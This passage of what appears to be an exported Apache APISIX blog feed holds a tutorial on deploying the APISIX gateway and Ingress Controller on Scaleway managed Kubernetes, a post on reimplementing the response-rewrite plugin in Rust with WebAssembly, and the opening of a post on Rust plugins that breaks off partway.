Community](https://apisix.apache.org/docs/general/join/)\\n- \ud83d\udc26 [Follow us on Twitter](https://twitter.com/ApacheAPISIX)\\n- \ud83d\udcdd [Find us on Slack](https://join.slack.com/t/the-asf/shared_invite/zt-vlfbf7ch-HkbNHiU_uDlcH_RvaHv9gQ)\\n- \ud83d\udce7 [Mail to us](dev@apisix.apache.org) with your questions."},{"id":"Deploy and Run Apache APISIX on Scaleway Cloud","metadata":{"permalink":"/blog/2022/10/19/deploy-apisix-on-scaleway-cloud","source":"@site/blog/2022/10/19/deploy-apisix-on-scaleway-cloud.md","title":"Deploy and Run Apache APISIX on Scaleway Cloud","description":"In this post, you will learn how easily deploy and run both Apache APISIX API Gateway and Ingress Controller on Scaleway Cloud Managed Kubernetes to efficiently manage, protect and observe your APIs in the cloud.","date":"2022-10-19T00:00:00.000Z","formattedDate":"October 19, 2022","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":8.825,"truncated":true,"authors":[{"name":"Bobur Umurzokov","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607","imageURL":"https://avatars.githubusercontent.com/u/14247607"}],"prevItem":{"title":"10 most common use cases of an API Gateway","permalink":"/blog/2022/10/27/ten-use-cases-api-gateway"},"nextItem":{"title":"Rewriting the Apache APISIX response-rewrite plugin in Rust","permalink":"/blog/2022/10/05/rust-apisix"}},"content":"> In this post, you will learn how easily deploy and run both [Apache APISIX API Gateway](https://apisix.apache.org/docs/apisix/getting-started/) and [Ingress Controller](https://apisix.apache.org/docs/ingress-controller/getting-started/) on [Scaleway Cloud Managed Kubernetes](https://www.scaleway.com/en/docs/) to efficiently manage, protect and observe your APIs in the cloud.\\n\\n\x3c!--truncate--\x3e\\n\\n![Apache APISIX as an API Management solution on Scaleway Cloud](https://static.apiseven.com/2022/10/19/634f92af0e74b.png)\\n\\nToday, more and more developers are looking at how they can bring their existing applications to the cloud\u2014or at how to build new cloud-native applications. Many organizations have significant investments in the migration of mission-critical applications running on-premises to fully supported environments to run these apps in the cloud. This post explains how to deploy and run both [Apache APISIX API Gateway](https://apisix.apache.org/docs/apisix/getting-started/) and [Ingress Controller](https://apisix.apache.org/docs/ingress-controller/getting-started/) on [Scaleway Cloud Managed Kubernetes](https://www.scaleway.com/en/docs/)\\n\\nFirstly, let\u2019s understand what is Apache APISIX and Scaleway, how you can leverage both solutions to serve your needs. Or you can just skip the intro sections and start with the tutorial.\\n\\n## What\u2019s Apache APISIX?\\n\\n[Apache APISIX](https://apisix.apache.org/) is an open-source\xa0 **API Gateway** under [Apache Software Foundation](https://www.apache.org/) that is lightweight, independently deployable, and scalable that can run anywhere that allows developers to manage API endpoints. You can also leverage APISIX as [Kubernetes Ingress Controller](url) to deliver high performance and get the benefits of stateful load balancing, traffic split, hot reloading, and expansion capabilities by means of its offered diverse plug-ins to satisfy your specific needs.\xa0 You can read more about the use cases and features offered by Apache APISIX in the [documentation](https://apisix.apache.org/docs/apisix/getting-started/).\\n\\n![Apache APISIX](https://static.apiseven.com/2022/10/17/634d545743b1a.jpg)\\n\\nIt is also possible to install Apache APISIX by\xa0[different methods](https://apisix.apache.org/docs/apisix/installation-guide/) ([Docker](https://www.docker.com/), [Helm](https://helm.sh/), or [RPM](https://rpm.org/)) and run it in the various public cloud providers because of its [cloud-native](https://learn.microsoft.com/en-us/dotnet/architecture/cloud-native/definition) behavior.\\n\\n## What is Scaleway?\\n\\n[Scaleway](https://www.scaleway.com/en/) is a cloud provider with a variety of services. The public cloud Scaleway elements offer all the important components of a general cloud provider such as [serverless](https://www.scaleway.com/en/serverless-functions/), [containers](https://www.scaleway.com/en/kubernetes-kapsule/), [storage & database](https://www.scaleway.com/en/database/), [virtual machines](https://www.scaleway.com/en/virtual-instances/), [networking](https://www.scaleway.com/en/all-products/#:~:text=Learn%20more-,Network,-Private%20Networks), [IoT hub](https://www.scaleway.com/en/iot-hub/), and many more. You can easily build, deploy and scale your applications in the flexible price model and cost-efficiently.\\n\\n![scaleway-og.webp](https://static.apiseven.com/2022/10/17/634d534a9c60e.webp)\\n\\nScaleway is the most complete cloud ecosystem trusted by 25000+ businesses in the EU market. It is also playing an active role in improving the open-source ecosystem which already includes many well-known open-source projects such as [NodeJS](https://nodejs.org/en/), [CentOS](https://www.centos.org/), [OpenSuse](https://www.opensuse.org/), and others. You might also want to learn about [the Scaleway Open Source Program here](https://www.scaleway.com/en/about-us/open-source-program/).\\n\\n## Apache APISIX as an API Management solution in the Scaleway Cloud\\n\\nApache APISIX is also a part of this cloud computing partnership program as it is a community project. The main purpose of being a part of the program is to give customers of Scaleway prospect to accelerate their business with an API-first approach by ready-to-use open-source API management solution for building, managing, securing, and observing all internal and external APIs.\\n\\nWe found out that currently, Scaleway does not provide any API management and analysis software in their cloud. As a result, we decided to become partners to connect with thousands of developers from all over the world to get answers and share knowledge, invest in our communities, and give them full control of services with the cloud tools to do what they love. For example, similar to well-known cloud vendors offering API Management solutions like [AWS API Gateway](https://aws.amazon.com/api-gateway/), [Azure API Management](https://azure.microsoft.com/en-us/products/api-management/#overview), or [Google Cloud Apigee](https://cloud.google.com/apigee), you can effortlessly get the benefit of APISIX to manage the full API life cycle.\\n\\nWith a small background knowledge of Apache APISIX and Scaleway Cloud, we can jump in to get started guide to bring APISIX and run it with Scaleway\u2019s Kubernetes [Kapsule](https://www.scaleway.com/en/docs/compute/kubernetes/concepts/#kubernetes-kapsule) or [Kosmos](https://www.scaleway.com/en/docs/compute/kubernetes/concepts/#kubernetes-kosmos).\\n\\n> **Note:** _Kubernetes Kapsule and Kosmos_  are two different cluster types that provide a managed environment to create, configure and run a cluster of preconfigured machines for containerized applications. This allows you to create Kubernetes clusters without the complexity of managing the infrastructure.\\n\\n## Prerequisites\\n\\n- For local host environment, you might need to install [Kubectl](https://kubernetes.io/docs/tasks/tools/) and [Helm](https://helm.sh/docs/intro/install/#from-the-helm-project). It is required to connect to the Kubernetes\'s cluster.\\n- You have an account and are logged into the [Scaleway console](https://console.scaleway.com/).\\n- You need create a Kubernetes cluster using the Scaleway Cloud by simply following the [Scaleway\u2019s Kubernetes Quickstart](https://www.scaleway.com/en/docs/compute/kubernetes/quickstart/) guide. You can use the [comprehensive documentation](https://www.scaleway.com/en/docs/) to help you go with console.\\n\\n## Deploy Apache APISIX and Ingress Controller\\n\\nAt this point, I can assume that you created a Kubernetes cluster type of **Kapsule**. Then, you need to open the **Scaleway console**, navigate to the **Kubernetes cluster** you created and download the cluster configuration file `kubeconfig` from the **Kubernetes cluster** and copy it to the local computer\'s `~/.kube/config` (the default path of kubectl).\\n\\n> Note: If you have configured the KUBECONFIG environment variable before, `kubectl` will load the KUBECONFIG environment variable first instead of ~/.kube/config. Please note when using.\\n\\n![Scaleway Kubernetes Cluster.PNG](https://static.apiseven.com/2022/10/17/634d374f73b2d.png)\\n\\n### Connect to a cluster with kubectl\\n\\nOnce your cluster is created and the `.kubeconfig` file is  downloaded, you can use this with `kubectl`, the Kubernetes command line tool, allowing you to run commands against your Kubernetes clusters. You can use kubectl from a terminal on your local computer to deploy applications, inspect and manage cluster resources, and view logs. See how to [connect to a cluster with kubectl](https://www.scaleway.com/en/docs/compute/kubernetes/how-to/connect-cluster-kubectl/) for more info.\\n\\nBelow you can find two kinds of deployment command examples, one for deploying APISIX and another for Ingress Controller.\\n\\n### Deploy and run APISIX\\n\\nTo install APISIX via Helm, run:\\n\\n``` shell\\n$ helm repo add apisix https://charts.apiseven.com\\n$ helm repo add bitnami https://charts.bitnami.com/bitnami\\n$ helm repo update\\n$ helm install apisix apisix/apisix --create-namespace --namespace apisix --set gateway.type=LoadBalancer\\n```\\n\\nAs an output, you will get the following with the notes:\\n\\n``` shell\\nNAME: apisix\\nLAST DEPLOYED: Thu Sep 15 01:14:12 2022\\nNAMESPACE: apisix\\nSTATUS: deployed\\nREVISION: 1\\nTEST SUITE: None\\nNOTES:\\n1. Get the application URL by running these commands:\\n     NOTE: It may take a few minutes for the LoadBalancer IP to be available.\\n           You can watch the status of by running \'kubectl get --namespace apisix svc -w apisix-gateway\'\\n  export SERVICE_IP=$(kubectl get svc --namespace apisix apisix-gateway --template \\"{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}\\")\\n  echo http://$SERVICE_IP:80\\n```\\n\\nAs it is mentioned in the notes, you should run the blow commands to get application IP/URL address:\\n\\n``` shell\\n$ export SERVICE_IP=$(kubectl get svc --namespace apisix apisix-gateway --template \\"{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}\\")\\n$ echo http://$SERVICE_IP:80\\n\\nhttp://51.159.10.6:80\\n```\\n\\nYou can check anytime the deployment status of APISIX:\\n\\n``` shell\\n$ kubectl get pods -n apisix # All resources are ready\\n\\nNAME                      READY   STATUS    RESTARTS   AGE\\napisix-656ff547f4-vvcdg   1/1     Running   0          3m9s\\napisix-etcd-0             1/1     Running   0          3m9s\\napisix-etcd-1             1/1     Running   0          3m9s\\napisix-etcd-2             1/1     Running   0          3m9s\\n\\n$ kubectl get service -n apisix\\n\\nNAME                   TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)             AGE\\napisix-admin           ClusterIP      10.33.189.212   <none>        9180/TCP            3m29s\\napisix-etcd            ClusterIP      10.43.213.105   <none>        2379/TCP,2380/TCP   3m29s\\napisix-etcd-headless   ClusterIP      None            <none>        2379/TCP,2380/TCP   3m29s\\napisix-gateway         LoadBalancer   10.35.46.143    51.159.10.6   80:30345/TCP        3m29s\\n\\n```\\n\\nAfter we make sure that APISIX is upon and running, we can verify it by creating a sample [Upstream](https://apisix.apache.org/docs/apisix/terminology/upstream/) (which targets an external mock service such as `httpbin.org`) and a [Route](https://apisix.apache.org/docs/apisix/terminology/route/).\\n\\nFirst, let\'s apply some changes to our Kubernetes manifest file to have APISIX pod access to the external service (`httpbin.org`). To do so, you can run the following command:\\n\\n``` shell\\n$ kubectl apply -f - <<EOF\\nkind: Service\\napiVersion: v1\\nmetadata:\\n  name: httpbin-external\\nspec:\\n  type: ExternalName\\n  externalName: httpbin.org\\nEOF\\n```\\n\\nNext, we can create our first test route with an upstream (backend service that is pointing to `httpbin.org`).\\n\\n> You need to replace `APISIX_POD` with the name of APISIX\'s pod.\\n\\n``` shell\\nkubectl exec -it ${APISIX_POD} -n apisix -- curl \\"http://127.0.0.1:9180/apisix/admin/routes/1\\" -H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n{\\n  \\"host\\": \\"httpbin.org\\",\\n  \\"uri\\": \\"/*\\",\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"httpbin-external.default.svc.cluster.local:80\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\nThen, we can verify access and if the newly created route is functioning correctly by running another final command:\\n\\n``` shell\\n$ curl http://51.159.10.6:80/get -H \'Host: httpbin.org\'\\n{\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.68.0\\",\\n    \\"X-Amzn-Trace-Id\\": \\"Root=1-63228c4e-0388e1b61255180620195210\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  }\\n}\\n```\\n\\nHere we go, APISIX Admin API is responding to our requests in the Scaleway Cloud and the request is forwarded to the external service.  \\n\\n### Deploy and run APISIX Ingress Controller\\n\\nNext, we will try to install and verify [Apache APISIX Ingress Controller](https://apisix.apache.org/docs/ingress-controller/getting-started/) is running in the Scaleway Cloud and we do very similar steps as we did for APISIX.\\n\\nTo install APISIX Ingress with helm:\\n\\n``` shell\\n$ helm repo add apisix https://charts.apiseven.com\\n$ helm repo add bitnami https://charts.bitnami.com/bitnami\\n$ helm repo update\\n\\n$ kubectl create ns ingress-apisix\\n$ helm install apisix apisix/apisix \\\\\\n  --set gateway.type=LoadBalancer \\\\\\n  --set ingress-controller.enabled=true \\\\\\n  --namespace ingress-apisix \\\\\\n  --set ingress-controller.config.apisix.serviceNamespace=ingress-apisix\\n\\n```\\n\\nThen, check the deployment status:\\n\\n``` shell\\n$ kubectl get pods -n ingress-apisix\\n\\nNAME                                         READY   STATUS    RESTARTS   AGE\\napisix-5bcf68b548-qrsqb                      1/1     Running   0          1m\\napisix-etcd-0                                1/1     Running   0          1m\\napisix-etcd-1                                1/1     Running   0          1m\\napisix-etcd-2                                1/1     Running   0          1m\\napisix-ingress-controller-75bd4d9b9b-7xfn5   1/1     Running   0          1m\\n\\n$ kubectl get svc -n ingress-apisix\\n\\napisix-admin                ClusterIP      10.36.120.143   <none>          9180/TCP            82m\\napisix-etcd                 ClusterIP      10.47.39.201    <none>          2379/TCP,2380/TCP   82m\\napisix-etcd-headless        ClusterIP      None            <none>          2379/TCP,2380/TCP   82m\\napisix-gateway              LoadBalancer   10.45.241.11    51.159.206.46   80:30197/TCP        82m\\napisix-ingress-controller   ClusterIP      10.47.236.40    <none>          80/TCP              82m\\n```\\n\\nAfterward, we can deploy mock server `htttbin` to the default namespace in order to test the ingress controller:\\n\\n``` shell\\nkubectl run httpbin --image kennethreitz/httpbin --port 80\\nkubectl expose pod httpbin --port 80\\n```\\n\\nNow we are ready to test ingress by creating a new route the same as below:\\n\\n``` shell\\nkubectl apply -f - <<EOF\\napiVersion: apisix.apache.org/v2\\nkind: ApisixRoute\\nmetadata:\\n  name: httpbin-route\\nspec:\\n  http:\\n    - name: rule1\\n      match:\\n        hosts:\\n          - httpbin.org\\n        paths:\\n          - \\"/*\\"\\n      backends:\\n        - serviceName: httpbin\\n          servicePort: 80\\nEOF\\n```\\n\\nFinally, we can verify the route is working correctly by running the following command:\\n\\n``` shell\\n$ curl http://51.159.206.46:80/get -H \'Host: httpbin.org\'\\n{\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.68.0\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  }\\n}\\n```\\n\\n## What\u2019s next\\n\\nUp to now, we learnt how to deploy its Apache APISIX and Ingress Controller to Scaleway Cloud by using Kubernetes Kapsule. From this stage, you can create a route, upstream and manage the traffic to your backend services with the available built-in plugins if you want to take advantage of more APISIX\'s features.\\n\\n### Recommended content\\n\\n\u2794 Watch Video Tutorial:\\n\\n- [Getting Started with Apache APISIX](https://youtu.be/dUOjJkb61so).\\n  \\n- [APIs security with Apache APISIX](https://youtu.be/hMFjhwLMtQ8).\\n\\n- [Implementing resilient applications with API Gateway (Circuit breaker)](https://youtu.be/aWzo0ysH__c).\\n\\n\u2794 Read the blog posts:\\n\\n- [Implementing resilient applications with API Gateway (Health Check)](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-health-check-338c).\\n\\n- [Overview of Apache APISIX API Gateway Plugins](https://dev.to/apisix/overview-of-apache-apisix-api-gateway-plugins-2m8o).\\n\\n### Community\u2935\ufe0f\\n\\n- \ud83d\ude4b [Join the Apache APISIX Community](https://apisix.apache.org/docs/general/join/)\\n- \ud83d\udc26 [Follow us on Twitter](https://twitter.com/ApacheAPISIX)\\n- \ud83d\udcdd [Find us on Slack](https://join.slack.com/t/the-asf/shared_invite/zt-vlfbf7ch-HkbNHiU_uDlcH_RvaHv9gQ)\\n- \ud83d\udce7 [Mail to us](dev@apisix.apache.org) with your questions."},{"id":"Rewriting the Apache APISIX response-rewrite plugin in Rust","metadata":{"permalink":"/blog/2022/10/05/rust-apisix","source":"@site/blog/2022/10/05/rust-apisix.md","title":"Rewriting the Apache APISIX response-rewrite plugin in Rust","description":"This article describes how to redevelop the response-rewrite plugin using Rust and WebAssembly.","date":"2022-10-05T00:00:00.000Z","formattedDate":"October 5, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":7.13,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Deploy and Run Apache APISIX on Scaleway Cloud","permalink":"/blog/2022/10/19/deploy-apisix-on-scaleway-cloud"},"nextItem":{"title":"Apache APISIX loves Rust!","permalink":"/blog/2022/09/28/rust-loves-apisix"}},"content":"> This article describes how to redevelop the response-rewrite plugin using Rust and WebAssembly.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/rust-apisix/2/\\" />\\n</head>\\n\\nLast week, I described the basics on [how to develop and deploy a Rust plugin for Apache APISIX](https://blog.frankel.ch/rust-apisix/1/). The plugin just logged a message when it received the request. Today, I want to leverage what we learned to create something more valuable: write part of the [response-rewrite](https://apisix.apache.org/docs/apisix/plugins/response-rewrite/) plugin with Rust.\\n\\n## Adding a hard-coded header\\n\\nLet\'s start small and add a hard-coded response header. Last week, we used the `on_http_request_headers()` function. The `proxy_wasm` specification defines several function hooks for each step in a request-response lifecycle:\\n\\n* `fn on_http_request_headers()`\\n* `fn on_http_request_body()`\\n* `fn on_http_request_trailers()`\\n* `fn on_http_response_headers()`\\n* `fn on_http_response_body()`\\n* `fn on_http_response_trailers()`\\n\\nIt looks like we need to implement `on_http_response_headers()`:\\n\\n```rust\\nimpl Context for HttpCall {}\\n\\nimpl HttpContext for HttpCall {\\n    fn on_http_response_headers(&mut self, _num_headers: usize, end_of_stream: bool) -> Action {\\n        warn!(\\"on_http_response_headers\\");\\n        if end_of_stream {                                      // 1\\n            self.add_http_response_header(\\"Hello\\", \\"World\\");    // 2\\n        }\\n        Action::Continue                                        // 3\\n    }\\n}\\n```\\n\\n1. If we reached the end of the stream...\\n2. ...add the header\\n3. Continue the rest of the lifecycle\\n\\n## Making the plugin configurable\\n\\nAdding hard-coded headers is fun but not helpful. The `response-rewrite` plugin allows configuring the headers to add and their value.\\n\\nImagine that we want to add the following headers in the configuration:\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream:\\n      type: roundrobin\\n      nodes:\\n        \\"httpbin.org:80\\": 1\\n    plugins:\\n      sample:\\n       conf: |                       # 1\\n         {\\n           \\"headers\\": {\\n             \\"add\\": {                # 2\\n               \\"Hello\\": \\"World\\",\\n               \\"Foo\\": \\"Bar\\"\\n             }\\n           }\\n         }\\n#END\\n```\\n\\n1. Plugin configuration\\n2. Headers to add. The Lua plugin also allows setting headers. In the following, we\'ll focus on add, while the GitHub repo shows both add and set.\\n\\nThe configuration is in JSON format, so we need additional dependencies:\\n\\n```toml\\n[dependencies]\\nserde = { version = \\"1.0\\", features = [\\"derive\\"] }\\nserde_derive = { version = \\"1.0\\", default-features = false }\\nserde_json = { version = \\"1.0\\", default-features = false, features = [\\"alloc\\"] }\\n```\\n\\nThe idea is to:\\n\\n* Read the configuration when APISIX creates the root context\\n* Pass it along each time APISIX creates the HTTP context\\n\\nThe `Config` object is pretty straightforward:\\n\\n```rust\\nuse serde_json::{Map, Value};\\nuse serde::Deserialize;\\n\\n#[derive(Deserialize, Clone)]        // 1-2\\nstruct Config {\\n    headers: Headers,                // 3\\n}\\n\\n#[derive(Deserialize, Clone)]        // 1-2\\nstruct Headers {\\n    add: Option<Map<String, Value>>, // 4\\n    set: Option<Map<String, Value>>, // 4\\n}\\n\\nstruct HttpCall {\\n    config: Config,\\n}\\n```\\n\\n1. `Deserialize` allows reading the string into a JSON structure\\n2. `Clone` allows passing the structure from the root context to the HTTP context\\n3. Standard JSON structure\\n4. `Option` manages the case when the user didn\'t use the attribute\\n\\nWe need to read the configuration when APISIX creates the root context - it happens once. For this, we need to use the `RootContext` trait and create a structure that implements it:\\n\\n```rust\\nstruct HttpCallRoot {\\n    config: Config,                                                                   // 1\\n}\\n\\nimpl Context for HttpCallRoot {}                                                      // 2\\n\\nimpl RootContext for HttpCallRoot {\\n    fn on_configure(&mut self, _: usize) -> bool {\\n        if let Some(config_bytes) = self.get_plugin_configuration() {                 // 3\\n            let result = String::from_utf8(config_bytes)                              // 4\\n                .map_err(|e| e.utf8_error().to_string())                              // 5\\n                .and_then(|s| serde_json::from_str(&s).map_err(|e| e.to_string()));   // 6\\n            return match result {\\n                Ok(config) => {\\n                    self.config = config;                                             // 7\\n                    true\\n                }\\n                Err(message) => {\\n                    error!(\\"An error occurred while reading the configuration file: {}\\", message);\\n                    false\\n                }\\n            };\\n        }\\n        true\\n    }\\n\\n    fn create_http_context(&self, _context_id: u32) -> Option<Box<dyn HttpContext>> {\\n        Some(Box::new(HttpCall {\\n            config: self.config.clone(),                                              // 8\\n        }))\\n    }\\n\\n    fn get_type(&self) -> Option<ContextType> {\\n        Some(ContextType::HttpContext)                                                // 9\\n    }\\n}\\n```\\n\\n1. Create a structure to store the configuration\\n2. Mandatory\\n3. Read the plugin configuration in a byte array\\n4. Stringify the byte array\\n5. Map the error to satisfy the compiler\\n6. JSONify the string\\n7. If everything has worked out, store the `config` `struct` in the root context\\n8. See below\\n9. Two types are available, `HttpContext` and `StreamContext`. We implemented the former.\\n\\nWe need to make the WASM proxy aware of the root context. Previously, we configured the creation of an HTTP context. We need to replace it with the creation of a root context.\\n\\n```rust\\nfn new_root() -> HttpCallRoot {\\n    HttpCallRoot { config: Config { headers: Headers { add: None, set: None } } }       // 1\\n}\\n\\nproxy_wasm::main! {{\\n    proxy_wasm::set_log_level(LogLevel::Trace);\\n    proxy_wasm::set_root_context(|_| -> Box<dyn RootContext> { Box::new(new_root()) }); // 2\\n}}\\n```\\n\\n1. Utility function\\n2. Create the root context instead of the HTTP one. The former knows how to create the latter via the `create_http_context` implementation.\\n\\nThe easiest part is to read the configuration from the HTTP context and write the headers:\\n\\n```rust\\nimpl HttpContext for HttpCall {\\n    fn on_http_response_headers(&mut self, _num_headers: usize, end_of_stream: bool) -> Action {\\n        warn!(\\"on_http_response_headers\\");\\n        if end_of_stream {\\n            if self.config.headers.add.is_some() {                               // 1\\n                let add_headers = self.config.headers.add.as_ref().unwrap();     // 2\\n                for (key, value) in add_headers.into_iter() {                    // 3\\n                    self.add_http_response_header(key, value.as_str().unwrap()); // 4\\n                }\\n            }\\n            if self.config.headers.set.is_some() {\\n                // Same as above for setting\\n            }\\n        }\\n        Action::Continue\\n    }\\n}\\n```\\n\\n1. If the user configured added headers...\\n2. ... get them\\n3. Loop over the key-value pairs\\n4. Write them as response headers\\n\\n## Hooking into Nginx variables\\n\\nThe `response-rewrite` plugin knows how to make use of Nginx variables. Let\'s implement this feature.\\n\\nThe idea is to check whether a value starting with `$` is an Nginx variable: if it exists, return its value; otherwise, return the variable name as if it was a standard configuration value.\\n\\nNote that it\'s a simplification; one can also wrap an Nginx variable in curly braces. But it\'s good enough for this blog post.\\n\\n```rust\\nfn get_nginx_variable_if_possible(ctx: &HttpCall, value: &Value) -> String {\\n    let value = value.as_str().unwrap();\\n    if value.starts_with(\'$\') {                                        // 1\\n        let option = ctx.get_property(vec![&value[1..value.len()]])    // 2\\n            .and_then(|bytes| String::from_utf8(bytes).ok());\\n        return if let Some(nginx_value) = option {\\n            nginx_value                                                // 3\\n        } else {\\n            value.to_string()                                          // 4\\n        }\\n    }\\n    value.to_string()                                                  // 5\\n}\\n```\\n\\n1. If the value is potentially an Nginx variable\\n2. Try to get the property value (without the trailing `$`)\\n3. Found the value, return it\\n4. Didn\'t find the value, return the variable\\n5. It was not a property, to begin with; return the variable\\n\\nWe can then try to get the variable before writing the header:\\n\\n```rust\\nfor (key, value) in add_headers.into_iter() {\\n    let value = get_nginx_variable_if_possible(self, value);\\n    self.add_http_response_header(key, &value);\\n}\\n```\\n\\n## Rewriting the body\\n\\nAnother feature of the original `response-rewrite` plugin is to change the body. To be clear, it doesn\'t work at the moment. If you\'re interested, what\'s the reason, please read further.\\n\\nLet\'s update the `Config` object to add a body section:\\n\\n```rust\\n#[derive(Deserialize, Clone)]\\nstruct Config {\\n    headers: Headers,\\n    body: String,\\n}\\n```\\n\\nThe documentation states that to rewrite the body, we need to let Nginx know during the headers phase:\\n\\n```rust\\nimpl HttpContext for HttpCall {\\n    fn on_http_response_headers(&mut self, _num_headers: usize, end_of_stream: bool) -> Action {\\n        warn!(\\"on_http_response_headers\\");\\n            // Add headers as above\\n            let body = &self.config.body;\\n            if !body.is_empty() {\\n                warn!(\\"Rewrite body is configured, letting Nginx know about it\\");\\n                self.set_property(vec![\\"wasm_process_resp_body\\"], Some(\\"true\\".as_bytes()));   // 1\\n                warn!(\\"Rewrite body is configured, resetting Content-Length\\");\\n                self.set_http_response_header(\\"Content-Length\\", None)                         // 2\\n            }\\n        }\\n        Action::Continue\\n    }\\n}\\n```\\n\\n1. Ping Nginx, we will rewrite the body\\n2. Reset the `Content-Length` as it won\'t be possible later on\\n\\nNow, we can rewrite it:\\n\\n```rust\\nimpl HttpContext for HttpCall {\\n    fn on_http_response_body(&mut self, _body_size: usize, end_of_stream: bool) -> Action {\\n        warn!(\\"on_http_response_body\\");\\n        let body = &self.config.body;\\n        if !body.is_empty() {\\n            if end_of_stream {\\n                warn!(\\"Rewrite body is configured, rewriting {}\\", body);\\n                let body = self.config.body.as_bytes();\\n                self.set_http_response_body(0, body.len(),body);\\n            } else {\\n                return Action::Pause;\\n            }\\n        }\\n        Action::Continue\\n    }\\n}\\n```\\n\\nIf we try to curl `localhost:9080`, Apache APISIX\'s log shows the following:\\n\\n```\\nrust-wasm-plugin-apisix-1  | 2022/09/29 08:29:50 [emerg] 44#44: *57096 panicked at \'unexpected status: 12\', /usr/local/cargo/registry/src/github.com-1ecc6299db9ec823/proxy-wasm-0.2.0/src/hostcalls.rs:135:23 while sending to client, client: 172.25.0.1, server: _, request: \\"GET / HTTP/1.1\\", upstream: \\"http://44.207.168.240:80/\\", host: \\"localhost:9080\\"\\n```\\n\\nThe reason is that the WASM Nginx module doesn\'t implement the `proxy-wasm` feature to rewrite the body at the moment.\\n\\nStatus 12 comes from the [proxy_wasm_types.h](https://github.com/api7/wasm-nginx-module/blob/main/src/proxy_wasm/proxy_wasm_types.h):\\n\\n```c\\ntypedef enum {\\n    PROXY_RESULT_UNIMPLEMENTED = 12,\\n} proxy_result_t;\\n```\\n\\n## Conclusion\\n\\nIn this post, we went beyond a dummy plugin to duplicate some of the features of the `response-rewrite` plugin. By writing the plugin in Rust, we can leverage its compile-time security to avoid most errors at runtime. Note that some of the `proxy-wasm` features are not implemented at the moment: be careful before diving head first.\\n\\nThe source code is available on [GitHub](https://github.com/ajavageek/apisix-rust-plugin).\\n\\n**To go further:**\\n\\n* [proxy-wasm spec](https://github.com/proxy-wasm/spec)\\n* [WASM Nginx module](https://github.com/api7/wasm-nginx-module)\\n* [WebAssembly for Proxies (Rust SDK)](https://github.com/proxy-wasm/proxy-wasm-rust-sdk)\\n* [Apache APISIX WASM](https://apisix.apache.org/docs/apisix/wasm/)"},{"id":"Apache APISIX loves Rust!","metadata":{"permalink":"/blog/2022/09/28/rust-loves-apisix","source":"@site/blog/2022/09/28/rust-loves-apisix.md","title":"Apache APISIX loves Rust!","description":"This article shows the steps to perform to develop and deploy WebAssembly plugins from Rust.","date":"2022-09-28T00:00:00.000Z","formattedDate":"September 28, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.48,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Rewriting the Apache APISIX response-rewrite plugin in Rust","permalink":"/blog/2022/10/05/rust-apisix"},"nextItem":{"title":"Building event-driven API services using CQRS, API Gateway and Serverless","permalink":"/blog/2022/09/23/build-event-driven-api"}},"content":"> This article shows the steps to perform to develop and deploy WebAssembly plugins from Rust.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/rust-apisix/1/\\" />\\n</head>\\n\\nApache APISIX is built upon the shoulders of two giants:\\n\\n* [NGINX](https://www.nginx.com/), a widespread Open Source reverse-proxy\\n* [OpenResty](https://openresty.org/en/), a platform that allows scripting NGINX with the [Lua](https://www.lua.org/) programming language via [LuaJIT](https://luajit.org/)\\n\\nThis approach allows APISIX to provide out-of-the-box Lua plugins that should fit most business requirements. But it always comes a time when generic plugins don\'t fit your requirements. In this case, you can write your own Lua plugin.\\n\\nHowever, if Lua is not part of your tech stack, [diving into a new ecosystem is a considerable investment](https://blog.frankel.ch/on-learning-new-programming-language/). Therefore, Apache APISIX offers developers to write plugins in several other languages. In this post, I\'d like to highlight how to write such a plugin with Rust.\\n\\n## A bit of context\\n\\nBefore I dive into the \\"how\\", let me first describe a bit of context surrounding the Rust integration in Apache APISIX. I believe it\'s a good story because it highlights the power of Open Source.\\n\\nIt starts with the Envoy proxy.\\n\\n> Envoy is an open source edge and service proxy, designed for cloud-native applications\\n>\\n> -- https://www.envoyproxy.io/\\n\\nAround 2019, Envoy\'s developers realized a simple truth. Since Envoy is a statically compiled binary, integrators who need to extend it must compile it from the modified source instead of using the official binary version. Issues range from supply chains more vulnerable to attacks to a longer drift when a new version is released. For end-users, whose core business is much further, it means having to hire specialized skills for this reason only.\\n\\nThe team considered to solve the issue with C++ extensions, but discarded this approach as neither <abbr title=\\"Application Programmer Interface\\">API</abbr>s nor <abbr title=\\"Application Binary Interface\\">ABI</abbr>s were stable. Instead, they chose to provide a stable WebAssembly-based ABI. If you\'re interested in a more detailed background, you can read the whole piece [on GitHub](https://github.com/proxy-wasm/spec/blob/master/docs/WebAssembly-in-Envoy.md).\\n\\nThe specification is available on [GitHub](https://github.com/proxy-wasm/spec).\\n\\n* 